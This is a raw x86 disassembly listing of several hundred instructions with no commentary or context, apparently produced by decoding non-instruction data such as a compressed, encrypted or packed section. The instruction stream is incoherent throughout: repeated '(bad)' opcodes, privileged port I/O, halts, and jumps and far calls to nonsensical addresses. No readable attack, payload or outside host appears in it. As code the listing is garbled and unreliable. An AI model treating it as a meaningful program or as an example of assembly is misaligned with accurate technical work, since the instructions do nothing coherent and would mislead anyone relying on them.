  40df57:	xor    edx,DWORD PTR [ebp+0x6356db8d]
  40df5d:	fbstp  TBYTE PTR [esi+0x7a]
  40df60:	sbb    eax,0x35ce42d8
  40df65:	ss pop esp
  40df67:	push   ecx
  40df68:	mov    dh,0x0
  40df6a:	fldcw  WORD PTR [eax-0x4e44ae4a]
  40df70:	mov    bl,0x10
  40df72:	push   esp
  40df73:	mov    ecx,0xf3524147
  40df78:	adc    al,0x6d
  40df7a:	add    ebx,DWORD PTR [edx]
  40df7c:	shr    DWORD PTR [esi-0xa],1
  40df7f:	cmp    ax,0xb783
  40df83:	test   DWORD PTR [esi+0x23213b8a],eax
  40df89:	adc    ecx,ebp
  40df8b:	fcmovbe st,st(0)
  40df8d:	adc    ch,BYTE PTR [ebx-0x77]
  40df90:	jb     0x40df92
  40df92:	imul   esi,edi,0xffffffcb
  40df95:	popf   
  40df96:	call   0x1aa1651b
  40df9b:	imul   esp,esi,0x51
  40df9e:	xchg   DWORD PTR [edx-0x5e],ebx
  40dfa1:	fstp   st(0)
  40dfa3:	aad    0xe7
  40dfa5:	pop    ebp
  40dfa6:	mov    eax,0x5d4c2328
  40dfab:	ret    0x42d2
  40dfae:	jmp    0x40df6e
  40dfb0:	and    ah,BYTE PTR [ebx]
  40dfb2:	adc    eax,DWORD PTR [ebx-0x2547267d]
  40dfb8:	inc    esi
  40dfb9:	ins    BYTE PTR es:[edi],dx
  40dfba:	fcmovne st,st(1)
  40dfbc:	jp     0x40df64
  40dfbe:	push   esi
  40dfbf:	dec    ebp
  40dfc0:	sti    
  40dfc1:	clc    
  40dfc2:	or     bl,bl
  40dfc4:	(bad)  
  40dfc5:	pop    ss
  40dfc6:	pop    ss
  40dfc7:	idiv   DWORD PTR [edi-0x53f5fc2b]
  40dfcd:	dec    esi
  40dfce:	jp     0x40dfdd
  40dfd0:	mov    al,ds:0x1d6ed6cb
  40dfd5:	inc    ebp
  40dfd6:	xchg   edx,eax
  40dfd7:	sbb    dl,bh
  40dfd9:	dec    esi
  40dfda:	(bad)  [esi-0x42]
  40dfdd:	fstp   st(2)
  40dfdf:	cs das 
  40dfe1:	mov    DWORD PTR [edx],ebp
  40dfe3:	bound  esi,QWORD PTR [eax+0x5de056ae]
  40dfe9:	add    bh,cl
  40dfeb:	jle    0x40df77
  40dfed:	or     ebx,ebx
  40dfef:	push   esi
  40dff0:	adc    esi,esp
  40dff2:	add    dh,BYTE PTR [edi-0x529a5c2d]
  40dff8:	add    eax,0x1724aeda
  40dffd:	inc    ebx
  40dffe:	cwde   
  40dfff:	stos   DWORD PTR es:[edi],eax
  40e000:	imul   edi,DWORD PTR [edx],0xffffffed
  40e003:	inc    edx
  40e004:	add    esi,DWORD PTR [esi+0x27a0f299]
  40e00a:	push   ss
  40e00b:	out    dx,al
  40e00c:	push   0xfffffff8
  40e00e:	loope  0x40e066
  40e010:	mov    ebx,0x50712895
  40e015:	pusha  
  40e016:	add    ch,al
  40e018:	scas   eax,DWORD PTR es:[edi]
  40e019:	in     eax,0xe2
  40e01b:	add    DWORD PTR [ebx],ecx
  40e01d:	or     ebp,DWORD PTR [ebp-0x3b]
  40e020:	xchg   BYTE PTR [ebp+eiz*2-0x6c],cl
  40e024:	dec    edx
  40e025:	lea    ebp,[ebp+0x63]
  40e028:	mov    eax,ds:0x45fa1f57
  40e02d:	mov    edx,0x8ec0d0e0
  40e032:	test   al,0xd8
  40e034:	stos   BYTE PTR es:[edi],al
  40e035:	push   ss
  40e036:	fcomip st,st(4)
  40e038:	jb     0x40e014
  40e03a:	add    eax,0x1771b6b6
  40e03f:	scas   al,BYTE PTR es:[edi]
  40e040:	push   0x42
  40e042:	jle    0x40e0b6
  40e044:	(bad)  
  40e045:	jge    0x40e0b1
  40e047:	(bad)  [esi]
  40e049:	push   ss
  40e04a:	(bad)  
  40e04b:	retf   0xe806
  40e04e:	sahf   
  40e04f:	loop   0x40e010
  40e051:	or     ch,bl
  40e053:	sub    bl,al
  40e055:	ss lahf 
  40e057:	mov    eax,ds:0x8a640426
  40e05c:	push   cs
  40e05d:	add    BYTE PTR [edi],al
  40e05f:	shl    BYTE PTR [esi-0x2c],0x9e
  40e063:	pop    edi
  40e064:	fnstcw WORD PTR [ecx]
  40e066:	fcomp  DWORD PTR [eax+0x68]
  40e069:	xchg   edi,eax
  40e06a:	adc    BYTE PTR [edx+edi*8],dl
  40e06d:	xlat   BYTE PTR ds:[ebx]
  40e06e:	rcl    bh,1
  40e070:	or     DWORD PTR [ebp-0x2574b913],esi
  40e076:	jle    0x40e007
  40e078:	mul    BYTE PTR [eax+0x40]
  40e07b:	jo     0x40e0bb
  40e07d:	jo     0x40e034
  40e07f:	sub    eax,0xd0983b6c
  40e084:	enter  0xd992,0xe6
  40e088:	(bad)  
  40e089:	ret    0x2b42
  40e08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08d:	sbb    al,0xe7
  40e08f:	adc    eax,ebx
  40e091:	jl     0x40e0dd
  40e093:	aad    0xd2
  40e095:	ror    dh,cl
  40e097:	and    ch,dl
  40e099:	loopne 0x40e039
  40e09b:	stc    
  40e09c:	(bad)  
  40e09d:	sbb    ch,BYTE PTR [eax+0x37]
  40e0a0:	sub    DWORD PTR [ebx-0x15e4e5f8],0x21a156b0
  40e0aa:	inc    edi
  40e0ab:	(bad)  [ecx-0x40927656]
  40e0b1:	push   ds
  40e0b2:	dec    edi
  40e0b3:	push   es
  40e0b4:	fdiv   DWORD PTR [esi+0x24bc355b]
  40e0ba:	dec    ebp
  40e0bb:	mov    ebp,0x2c250fd7
  40e0c0:	push   ecx
  40e0c1:	and    dh,BYTE PTR [esi-0x1fb1dc35]
  40e0c7:	fbld   TBYTE PTR [eax+eax*2+0x1b6c2c2d]
  40e0ce:	dec    esp
  40e0cf:	mov    al,ds:0x642dc711
  40e0d4:	bound  esp,QWORD PTR [ecx-0x5f]
  40e0d7:	dec    ebx
  40e0d8:	sbb    al,0x4b
  40e0da:	xor    al,0x2f
  40e0dc:	inc    ebx
  40e0dd:	scas   al,BYTE PTR es:[edi]
  40e0de:	sbb    bl,0xb6
  40e0e1:	push   ebx
  40e0e2:	mov    ds:0x6d6ebb02,al
  40e0e7:	neg    DWORD PTR [ebp+0x0]
  40e0ea:	jo     0x40e0b1
  40e0ec:	test   DWORD PTR [edx-0x2147b9ba],edi
  40e0f2:	adc    al,0x2e
  40e0f4:	pop    edi
  40e0f5:	fdivr  DWORD PTR [esi+eiz*2]
  40e0f8:	fs xor al,dh
  40e0fb:	add    bl,ch
  40e0fd:	sbb    DWORD PTR [esi+0x6a58dd73],eax
  40e103:	inc    eax
  40e104:	pop    edi
  40e105:	jmp    0x2e51cebb
  40e10a:	outs   dx,BYTE PTR ds:[esi]
  40e10b:	ins    DWORD PTR es:[edi],dx
  40e10c:	imul   ebp,DWORD PTR [eax+0x5c824783],0xffffffcc
  40e113:	pop    ss
  40e114:	sub    DWORD PTR [ecx-0x69],esi
  40e117:	pop    ebx
  40e118:	imul   ebx,DWORD PTR [eax-0xa898d80],0x26
  40e11f:	pop    ds
  40e120:	ins    DWORD PTR es:[edi],dx
  40e121:	mov    bh,0xaf
  40e123:	pop    ebx
  40e124:	and    DWORD PTR fs:[edx+0x61],eax
  40e128:	fld    QWORD PTR [esp+ecx*8-0x76]
  40e12c:	jp     0x40e172
  40e12e:	mov    dh,BYTE PTR [esi+0x4132b6da]
  40e134:	stos   BYTE PTR es:[edi],al
  40e135:	add    eax,DWORD PTR [edi+0x55]
  40e138:	sbb    BYTE PTR [esi+0x73],dh
  40e13b:	mov    al,0x51
  40e13d:	inc    esp
  40e13e:	xchg   ebx,eax
  40e13f:	rcl    bh,cl
  40e141:	sub    DWORD PTR [ebx-0x52494fd8],0xffffffdd
  40e148:	fidivr DWORD PTR ds:0x308a05d1
  40e14e:	sub    DWORD PTR [ecx-0x4a5e52e8],ecx
  40e154:	mov    esp,DWORD PTR [eax+0x21]
  40e157:	pop    ebp
  40e158:	dec    ecx
  40e159:	push   0x15d05bb3
  40e15e:	jo     0x40e103
  40e160:	jg     0x40e143
  40e162:	ficomp DWORD PTR [edi+edi*8]
  40e165:	sub    DWORD PTR [esi],edx
  40e167:	mov    al,0xf5
  40e169:	push   esp
  40e16a:	dec    edx
  40e16b:	push   ebp
  40e16c:	inc    esi
  40e16d:	popf   
  40e16e:	push   es
  40e16f:	lods   eax,DWORD PTR ds:[esi]
  40e170:	push   0xb46eb6dc
  40e175:	das    
  40e176:	(bad)  
  40e177:	xchg   ecx,eax
  40e178:	dec    esi
  40e179:	lock mov cl,BYTE PTR [ebx]
  40e17c:	test   DWORD PTR [ebp-0x235189c7],eax
  40e182:	std    
  40e183:	or     al,0x16
  40e185:	(bad)  [esi+0x4c338655]
  40e18b:	sub    al,0x74
  40e18d:	outs   dx,DWORD PTR ds:[esi]
  40e18e:	cmc    
  40e18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e190:	mov    al,0xb4
  40e192:	mov    ch,0xa5
  40e194:	shl    BYTE PTR [ecx+0x6c3b5966],0x7d
  40e19b:	test   BYTE PTR [ebx],bl
  40e19d:	in     eax,dx
  40e19e:	(bad)  
  40e19f:	mov    dh,0x88
  40e1a1:	dec    ecx
  40e1a2:	xor    cl,BYTE PTR [ecx]
  40e1a4:	or     DWORD PTR [ebp+0x56caa92],eax
  40e1aa:	test   DWORD PTR [esi-0x4d3493af],esi
  40e1b0:	ja     0x40e193
  40e1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b3:	jbe    0x40e1f7
  40e1b5:	pop    es
  40e1b6:	shr    BYTE PTR [ebp+0x1694064],0x90
  40e1bd:	jae    0x40e144
  40e1bf:	mov    esp,0x943883b4
  40e1c4:	jecxz  0x40e1f9
  40e1c6:	hlt    
  40e1c7:	mov    ds:0x4a00e05f,al
  40e1cc:	jbe    0x40e177
  40e1ce:	sub    DWORD PTR [eax+0x348a8473],edi
  40e1d4:	retf   
  40e1d5:	addr16 dec esi
  40e1d7:	sbb    ecx,0x28
  40e1da:	push   eax
  40e1db:	mov    bh,0x7d
  40e1dd:	pop    eax
  40e1de:	retf   0x9090
  40e1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e2:	sub    BYTE PTR [ebp+0x3e07680b],0xd4
  40e1e9:	adc    al,0x93
  40e1eb:	pop    ebx
  40e1ec:	mov    ebx,0xeb0085b5
  40e1f1:	dec    ebp
  40e1f2:	mov    ecx,0x2ce5140
  40e1f7:	inc    ecx
  40e1f8:	or     ebp,DWORD PTR [esp+esi*4+0x1b]
  40e1fc:	ret    
  40e1fd:	in     al,0xb9
  40e1ff:	outs   dx,BYTE PTR ds:[esi]
  40e200:	xor    al,dl
  40e202:	test   al,0x1b
  40e204:	shr    DWORD PTR [ebp+0x54c86e83],1
  40e20a:	int3   
  40e20b:	std    
  40e20c:	ffreep st(5)
  40e20e:	sub    BYTE PTR [esi],dl
  40e210:	fsubr  DWORD PTR [eax+0x1d]
  40e213:	xor    eax,0xbd527866
  40e218:	pop    ss
  40e219:	xor    ecx,ecx
  40e21b:	mov    edi,0x7c5c6df0
  40e220:	icebp  
  40e221:	dec    esp
  40e222:	stc    
  40e223:	push   esi
  40e224:	push   0x63b0943c
  40e229:	add    dh,al
  40e22b:	xor    al,0xb6
  40e22d:	jbe    0x40e298
  40e22f:	sub    edx,edi
  40e231:	scas   eax,DWORD PTR es:[edi]
  40e232:	cmc    
  40e233:	popa   
  40e234:	stos   BYTE PTR es:[edi],al
  40e235:	ja     0x40e20b
  40e237:	sbb    al,ch
  40e239:	add    ch,BYTE PTR [eax+0x14]
  40e23c:	std    
  40e23d:	pop    ebx
  40e23e:	jae    0x40e1cf
  40e240:	aaa    
  40e241:	push   ss
  40e242:	sbb    dl,BYTE PTR [edi+0x271b044c]
  40e248:	fdiv   QWORD PTR [eax]
  40e24a:	lahf   
  40e24b:	mov    DWORD PTR [esi+esi*4-0x1b],edi
  40e24f:	dec    ebx
  40e250:	pop    ebx
  40e251:	dec    esp
  40e252:	repnz pop edi
  40e254:	in     al,dx
  40e255:	add    BYTE PTR [esi],ch
  40e257:	cmp    eax,0x5ca1bfe0
  40e25c:	sub    bh,BYTE PTR [edi+0x64488451]
  40e262:	add    BYTE PTR [edi+eax*8+0x95ad6b],dh
  40e269:	mov    eax,0x25f5135
  40e26e:	push   eax
  40e26f:	push   esi
  40e270:	cmp    BYTE PTR [ebx-0x25],bl
  40e273:	add    eax,0x8ae36ed
  40e278:	(bad)  
  40e279:	sub    al,0x87
  40e27b:	lods   eax,DWORD PTR ds:[esi]
  40e27c:	out    dx,eax
  40e27d:	daa    
  40e27e:	outs   dx,BYTE PTR ds:[esi]
  40e27f:	ins    BYTE PTR es:[edi],dx
  40e280:	sbb    ecx,DWORD PTR [ebx]
  40e282:	adc    BYTE PTR [esi-0xc765cb8],ah
  40e288:	xchg   esi,eax
  40e289:	pop    edi
  40e28a:	pop    eax
  40e28b:	cmp    eax,0x9ed472dc
  40e290:	adc    al,0x13
  40e293:	dec    ebx
  40e294:	push   0x3b
  40e296:	inc    edx
  40e297:	popa   
  40e298:	popa   
  40e299:	mov    ebx,0x4a54b30e
  40e29e:	or     bl,cl
  40e2a0:	and    BYTE PTR [ecx],dh
  40e2a2:	jbe    0x40e25b
  40e2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a5:	loopne 0x40e27d
  40e2a7:	sub    edi,DWORD PTR [ebx-0x14ba9f34]
  40e2ad:	sbb    bl,bl
  40e2af:	push   0x551da08
  40e2b4:	and    ebx,ebx
  40e2b6:	xchg   ebp,eax
  40e2b7:	and    DWORD PTR [edx-0x2e33124c],0x2ccf4a0b
  40e2c1:	scas   eax,DWORD PTR es:[edi]
  40e2c2:	popa   
  40e2c3:	jmp    0xc1b0298a
  40e2c8:	or     eax,0x7620d7f5
  40e2cd:	mov    al,ds:0x6d4b0b0b
  40e2d2:	hlt    
  40e2d3:	enter  0xec38,0x1
  40e2d7:	xor    bh,0x9d
  40e2da:	push   edi
  40e2db:	mov    bh,0xd6
  40e2dd:	or     ch,BYTE PTR [esi+edx*4-0x5379f144]
  40e2e4:	add    eax,0xd6edb42e
  40e2e9:	leave  
  40e2ea:	fld    st(3)
  40e2ec:	mov    dh,0xb
  40e2ee:	mov    ecx,0xc9066759
  40e2f3:	outs   dx,BYTE PTR ds:[esi]
  40e2f4:	in     eax,dx
  40e2f5:	inc    esi
  40e2f6:	fld    TBYTE PTR [esi-0x66]
  40e2f9:	ret    0x82a
  40e2fc:	xor    BYTE PTR [edi],dl
  40e2fe:	(bad)  
  40e2ff:	hlt    
  40e300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e301:	or     BYTE PTR [eax-0x95b24c0],bh
  40e307:	push   cs
  40e308:	repz push edi
  40e30a:	push   cs
  40e30b:	aad    0x6d
  40e30d:	popa   
  40e30e:	imul   edi,DWORD PTR [ebx+0x54],0x74
  40e312:	sbb    eax,0xa8d764e2
  40e317:	aad    0x6e
  40e319:	sbb    ebx,DWORD PTR [ebx]
  40e31b:	or     eax,0xa39788c
  40e320:	inc    edx
  40e321:	dec    esp
  40e322:	pop    DWORD PTR [esi+eax*1+0x53]
  40e326:	jne    0x40e2c9
  40e328:	sub    DWORD PTR [edi+0x158ec7b6],ebp
  40e32e:	iret   
  40e32f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e331:	sub    BYTE PTR [ebp-0x59],0x39
  40e335:	jecxz  0x40e399
  40e337:	sbb    dl,bl
  40e339:	pop    ecx
  40e33a:	fcom   DWORD PTR [esi]
  40e33c:	mov    edx,0x15c82e82
  40e341:	ffreep st(0)
  40e343:	ret    0xd89e
  40e346:	adc    DWORD PTR [edx+ebx*2+0x7],ebx
  40e34a:	retf   
  40e34b:	pop    ecx
  40e34c:	imul   edi,edx,0x1b814a13
  40e352:	pop    ebx
  40e353:	ins    BYTE PTR es:[edi],dx
  40e354:	rcr    BYTE PTR [edx+0x50],1
  40e357:	fcomp  DWORD PTR [edi+edi*8-0x72492f91]
  40e35e:	mov    cs,WORD PTR [edx+0xa78cd9]
  40e364:	mov    bh,0x92
  40e366:	adc    ebx,edx
  40e368:	mov    dh,0x2d
  40e36a:	fisub  DWORD PTR [ebp-0x1]
  40e36d:	cmc    
  40e36e:	(bad)  
  40e36f:	fisub  DWORD PTR [ecx-0x4949f347]
  40e375:	lods   eax,DWORD PTR ds:[esi]
  40e376:	stos   DWORD PTR es:[edi],eax
  40e377:	mov    edi,0x7dd3bcd1
  40e37c:	xor    ch,BYTE PTR [edi+0x85b6830]
  40e382:	fidivr DWORD PTR [ebx]
  40e384:	mov    cl,0x2e
  40e386:	mov    dh,BYTE PTR [ebx+0x6caddabe]
  40e38c:	lods   eax,DWORD PTR ds:[esi]
  40e38d:	fsub   QWORD PTR [eax]
  40e38f:	add    al,0x44
  40e391:	xor    cl,BYTE PTR ds:0x8850bbfe
  40e397:	push   ss
  40e398:	sub    BYTE PTR [ebx+eiz*4+0x4f],0x91
  40e39d:	pop    ds
  40e39e:	cwde   
  40e39f:	fisubr DWORD PTR [ebp-0x14849f7d]
  40e3a5:	push   eax
  40e3a6:	push   cs
  40e3a7:	fucomi st,st(1)
  40e3a9:	push   eax
  40e3aa:	fcmovu st,st(0)
  40e3ac:	push   0xffffffdd
  40e3ae:	retf   
  40e3af:	and    BYTE PTR [ebx+0x6fce5804],al
  40e3b5:	and    dh,BYTE PTR [ecx-0x3de5ca4b]
  40e3bb:	(bad)  [eax]
  40e3bd:	mov    dh,0xab
  40e3bf:	scas   eax,DWORD PTR es:[edi]
  40e3c0:	push   ebp
  40e3c1:	fdiv   DWORD PTR [esi]
  40e3c3:	fcomp  DWORD PTR [edx]
  40e3c5:	into   
  40e3c6:	ror    DWORD PTR [esi+0x7a],1
  40e3c9:	jg     0x40e36c
  40e3cb:	fs push eax
  40e3cd:	lds    esi,FWORD PTR [esi-0x39ad7223]
  40e3d3:	ds jle 0x40e3bf
  40e3d6:	jp     0x40e358
  40e3d8:	pop    ebx
  40e3d9:	(bad)  [esi-0x5c]
  40e3dc:	pop    ds
  40e3dd:	jae    0x40e432
  40e3df:	enter  0xe059,0x19
  40e3e3:	call   0x5c39:0xec107694
  40e3ea:	dec    edi
  40e3eb:	jbe    0x40e3c1
  40e3ed:	dec    eax
  40e3ee:	pop    ecx
  40e3ef:	lods   eax,DWORD PTR ds:[esi]
  40e3f0:	inc    esi
  40e3f1:	mov    al,0x2d
  40e3f3:	(bad)  
  40e3f4:	mov    esi,0x465e74b6
  40e3f9:	fild   DWORD PTR [edx+0x43]
  40e3fc:	shl    eax,0x29
  40e3ff:	popa   
  40e400:	and    eax,0xff7a7c19
  40e405:	inc    edx
  40e406:	mov    ebx,0xf391b6d
  40e40b:	fisub  DWORD PTR [ebx-0x74]
  40e40e:	in     eax,0x51
  40e410:	or     BYTE PTR [ebp-0x12e491af],al
  40e416:	mov    BYTE PTR [edx+0x35],ch
  40e419:	lahf   
  40e41a:	lods   eax,DWORD PTR ds:[esi]
  40e41b:	pop    ecx
  40e41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e41d:	xchg   edx,eax
  40e41e:	mov    al,0x1
  40e420:	loop   0x40e3d8
  40e422:	jle    0x40e464
  40e424:	cmp    bh,ch
  40e426:	push   cs
  40e427:	arpl   WORD PTR [ebp+edx*2+0x6e],di
  40e42b:	sbb    ebx,DWORD PTR [ebx+0x17]
  40e42e:	mov    ds:0x904ec230,al
  40e433:	inc    esi
  40e434:	push   eax
  40e435:	dec    eax
  40e436:	call   0x346fbafb
  40e43b:	mov    ds:0x3503dc3a,al
  40e440:	clc    
  40e441:	cs loope 0x40e41a
  40e444:	push   edx
  40e445:	mov    ebx,0x6274319f
  40e44a:	sub    DWORD PTR [edi-0x75],ebx
  40e44d:	sub    eax,0x9adb6459
  40e452:	mov    al,ds:0xfeca15b
  40e457:	and    al,0xad
  40e459:	pop    ecx
  40e45a:	jge    0x40e4a0
  40e45c:	add    esi,DWORD PTR [edi+0x37726b76]
  40e462:	push   esp
  40e463:	adc    eax,0xb179c847
  40e468:	in     eax,dx
  40e469:	adc    ebx,esp
  40e46b:	push   0x8af91fc5
  40e470:	mov    esp,0xedb629f6
  40e475:	inc    edx
  40e476:	popa   
  40e477:	jo     0x40e44a
  40e479:	mov    ch,0x25
  40e47b:	ins    DWORD PTR es:[edi],dx
  40e47c:	mov    bl,0x3e
  40e47e:	aam    0x2
  40e480:	shr    BYTE PTR [ecx+0x63],cl
  40e483:	mov    eax,ds:0x1a0f1ab
  40e488:	xchg   ebx,eax
  40e489:	jne    0x40e441
  40e48b:	imul   esi,DWORD PTR [esi+ebp*1-0x14c924a],0x2d
  40e493:	add    eax,0x1120d231
  40e498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e499:	test   DWORD PTR [ebp+0x7a09812],eax
  40e49f:	retf   0x50b9
  40e4a2:	cmp    ch,al
  40e4a4:	inc    edx
  40e4a5:	stc    
  40e4a6:	jecxz  0x40e466
  40e4a8:	add    BYTE PTR [edi],bl
  40e4aa:	mov    ds:0xf7b18a4f,al
  40e4af:	mov    ds:0xdb75add5,eax
  40e4b4:	sahf   
  40e4b5:	mov    bh,0x5f
  40e4b7:	sbb    BYTE PTR ds:0x69f774d6,dh
  40e4bd:	xchg   edi,eax
  40e4be:	cmp    cl,BYTE PTR [edx+0x5321b4d]
  40e4c4:	mov    DWORD PTR [edx+0xa372b44],ebp
  40e4ca:	(bad)  [esi+0x6b]
  40e4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ce:	xchg   edx,eax
  40e4cf:	fbstp  TBYTE PTR [edx-0x1bbb456b]
  40e4d5:	test   DWORD PTR [ebp+0x0],ecx
  40e4d8:	aaa    
  40e4d9:	fsub   DWORD PTR [ebx]
  40e4db:	outs   dx,BYTE PTR ds:[esi]
  40e4dc:	mov    DWORD PTR [esi],esi
  40e4de:	mov    esi,0x6c0c58aa
  40e4e3:	sub    al,0x6c
  40e4e5:	clc    
  40e4e6:	mov    cl,0x61
  40e4e8:	test   DWORD PTR [esi-0x3f],esp
  40e4eb:	inc    edx
  40e4ec:	mov    ch,ah
  40e4ee:	inc    esi
  40e4ef:	sub    ebp,edi
  40e4f1:	scas   al,BYTE PTR es:[edi]
  40e4f2:	push   ebp
  40e4f3:	xchg   BYTE PTR [ebx],bh
  40e4f5:	stos   DWORD PTR es:[edi],eax
  40e4f6:	xor    dl,BYTE PTR ds:0x118e81b
  40e4fc:	push   edx
  40e4fd:	imul   ebx,DWORD PTR [ebx+0x47],0xffffffc5
  40e501:	jbe    0x40e499
  40e503:	jne    0x40e56d
  40e505:	(bad)  
  40e506:	jmp    0xc6847b04
  40e50b:	lea    ebp,[esi]
  40e50d:	mov    al,ds:0x51f3593e
  40e512:	push   esi
  40e513:	pop    edi
  40e514:	mov    ah,0x2d
  40e516:	pop    ebx
  40e517:	add    esi,DWORD PTR [esi-0x115a089]
  40e51d:	sti    
  40e51e:	add    al,0xb1
  40e520:	jl     0x40e4dd
  40e522:	mov    al,0xa4
  40e524:	cmp    eax,0x74dd7c4c
  40e529:	push   ss
  40e52a:	add    BYTE PTR [edx],ch
  40e52c:	int3   
  40e52d:	jo     0x40e4e5
  40e52f:	test   DWORD PTR [ebp-0x1c6cc4a],eax
  40e535:	test   eax,0x389ea6a4
  40e53a:	mov    al,0xad
  40e53c:	or     eax,0x888d3616
  40e541:	pop    eax
  40e542:	rcr    BYTE PTR [ecx-0x10],cl
  40e545:	jg     0x40e571
  40e547:	ins    DWORD PTR es:[edi],dx
  40e548:	fild   DWORD PTR [ebp-0xc64c2c7]
  40e54e:	je     0x40e567
  40e550:	ret    0x8961
  40e553:	sub    BYTE PTR [ebp-0x6af823d3],0x90
  40e55a:	(bad)  
  40e55b:	out    dx,eax
  40e55c:	and    esi,DWORD PTR [edx]
  40e55e:	pop    ds
  40e55f:	test   al,0xf
  40e561:	cs xor eax,0x75dc77af
  40e567:	out    dx,eax
  40e568:	inc    edi
  40e569:	pop    ebx
  40e56a:	push   0x29f6b62a
  40e56f:	lods   al,BYTE PTR ds:[esi]
  40e570:	aaa    
  40e571:	mov    BYTE PTR [ebx],al
  40e573:	dec    edx
  40e574:	shl    DWORD PTR [ebp+0x46c170b2],1
  40e57a:	mov    al,ds:0xc560a724
  40e57f:	mov    ds:0x99035b6e,eax
  40e584:	adc    al,0xad
  40e586:	mov    eax,0x519b1fe0
  40e58b:	or     BYTE PTR [edi+0x280b935b],0xa1
  40e592:	lahf   
  40e593:	jbe    0x40e528
  40e595:	mov    ds:0x16d0b803,eax
  40e59a:	ror    BYTE PTR [edx-0x2913b91a],cl
  40e5a0:	xchg   BYTE PTR [edi-0x3b],dl
  40e5a3:	lea    esi,[esi+0x4b80b488]
  40e5a9:	xor    ebp,DWORD PTR [ecx+0x21]
  40e5ac:	mov    al,0x50
  40e5ae:	sbb    ebx,DWORD PTR [ebx+0x5a]
  40e5b1:	in     al,dx
  40e5b2:	add    ch,BYTE PTR [eax+ebp*4-0xf]
  40e5b6:	jmp    0x2b85:0xa17011d6
  40e5bd:	jnp    0x40e5eb
  40e5bf:	xor    eax,0xb40fe43
  40e5c4:	or     ebx,ebx
  40e5c6:	jp     0x40e557
  40e5c8:	sub    BYTE PTR [ebp+0xc],0x82
  40e5cc:	inc    eax
  40e5cd:	pop    eax
  40e5ce:	push   0xda401adb
  40e5d3:	mov    ebp,0x12d4c438
  40e5d8:	xor    eax,0x17376c44
  40e5dd:	lods   al,BYTE PTR ds:[esi]
  40e5de:	retf   
  40e5df:	inc    BYTE PTR [ebp-0x3e89758c]
  40e5e5:	push   eax
  40e5e6:	mov    ebx,0xf20a88ad
  40e5eb:	inc    edi
  40e5ec:	sbb    al,0x77
  40e5ee:	sbb    eax,0xb6da25e6
  40e5f3:	fisubr DWORD PTR [esi]
  40e5f5:	mov    eax,ds:0xfa83e413
  40e5fa:	shr    BYTE PTR [eax+0x5b],0xb1
  40e5fe:	mov    ch,0x58
  40e600:	or     esp,DWORD PTR [edx+0x14]
  40e603:	cmp    al,0xa2
  40e605:	mov    eax,ds:0x61b0b06f
  40e60a:	jbe    0x40e590
  40e60c:	mov    dl,0x4
  40e60e:	ret    
  40e60f:	ret    0x9cac
  40e612:	add    BYTE PTR ds:0x796dada,ah
  40e618:	xchg   edx,eax
  40e619:	sub    DWORD PTR [edx+0x28d54422],ebx
  40e61f:	outs   dx,BYTE PTR ds:[esi]
  40e620:	sbb    eax,DWORD PTR [ebp-0x3706da1a]
  40e626:	add    eax,0xa54bbf7a
  40e62b:	test   al,0xed
  40e62d:	or     BYTE PTR [esi+0x2],cl
  40e630:	adc    al,0x3e
  40e632:	fwait
  40e633:	or     eax,0x6db47362
  40e638:	out    dx,eax
  40e639:	inc    edx
  40e63a:	add    DWORD PTR [ebp-0xc],0x11
  40e63e:	cld    
  40e63f:	popa   
  40e640:	popa   
  40e641:	mov    eax,ds:0xa4cff0dd
  40e646:	mov    edi,0x634057fa
  40e64b:	dec    edi
  40e64c:	ins    DWORD PTR es:[edi],dx
  40e64d:	pop    ebp
  40e64e:	aam    0x6d
  40e650:	sbb    DWORD PTR [eax],esp
  40e652:	ss ds stos DWORD PTR es:[edi],eax
  40e655:	lock jge 0x40e66e
  40e658:	outs   dx,BYTE PTR ds:[esi]
  40e659:	cmp    DWORD PTR [esi],esi
  40e65b:	pop    esp
  40e65c:	out    0x3c,al
  40e65e:	rcl    BYTE PTR [edx],0x7
  40e661:	pop    ecx
  40e662:	xor    al,0x8d
  40e664:	or     eax,0x9d6edb53
  40e669:	jmp    0x976407f
  40e66e:	sbb    esi,DWORD PTR [ebp-0x2f]
  40e671:	lods   eax,DWORD PTR ds:[esi]
  40e672:	jl     0x40e62f
  40e674:	fcos   
  40e676:	es loope 0x40e604
  40e679:	or     DWORD PTR [ecx+0x7a6db5b1],esi
  40e67f:	pop    edx
  40e680:	adc    DWORD PTR [edi+0x6033be9d],edx
  40e686:	outs   dx,BYTE PTR ds:[esi]
  40e687:	sbb    ebx,ebx
  40e689:	mov    dh,0xfc
  40e68b:	mov    es,WORD PTR [ebx-0x1861e8e0]
  40e691:	cmp    DWORD PTR [esi+0x29451fe7],eax
  40e697:	mov    edx,0x3dc19a00
  40e69c:	fild   DWORD PTR [edx-0x75]
  40e69f:	or     bh,BYTE PTR [eax-0x4d]
  40e6a2:	dec    esp
  40e6a3:	lahf   
  40e6a4:	push   ebx
  40e6a5:	imul   ebx,DWORD PTR [ebx],0xac83f6df
  40e6ab:	sahf   
  40e6ac:	sub    eax,0x322605bc
  40e6b1:	stc    
  40e6b2:	jle    0x40e6b2
  40e6b4:	ins    DWORD PTR es:[edi],dx
  40e6b5:	ins    BYTE PTR es:[edi],dx
  40e6b6:	mov    ah,0xb
  40e6b8:	mov    fs,WORD PTR [ebp+0x2418a15c]
  40e6be:	ss nop
  40e6c0:	(bad)  [esi+0x173eb016]
  40e6c6:	fcmovnbe st,st(1)
  40e6c8:	call   FWORD PTR [edx]
  40e6ca:	pop    ecx
  40e6cb:	push   ebx
  40e6cc:	fidiv  DWORD PTR [esi-0x5b5f927b]
  40e6d2:	ror    DWORD PTR [esi+0x7acda778],cl
  40e6d8:	mov    bh,0x61
  40e6da:	popa   
  40e6db:	mov    eax,ds:0x2cb50e5d
  40e6e0:	clc    
  40e6e1:	jmp    0x40e690
  40e6e3:	(bad)  
  40e6e4:	dec    edx
  40e6e5:	mov    dl,dl
  40e6e7:	inc    edx
